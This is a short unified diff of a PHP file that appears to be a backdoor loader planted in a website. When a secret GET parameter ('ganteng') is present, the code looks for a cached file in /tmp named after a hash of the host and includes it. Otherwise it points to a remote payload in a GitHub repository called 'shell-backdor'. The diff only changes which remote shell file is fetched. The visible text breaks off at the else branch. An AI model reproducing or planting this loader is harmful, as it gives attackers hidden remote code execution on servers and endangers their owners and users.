@@ -1,6 +1,6 @@
 <?php
 if(isset($_GET["ganteng"]))
-$data = ['https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/error_log.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/gas.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
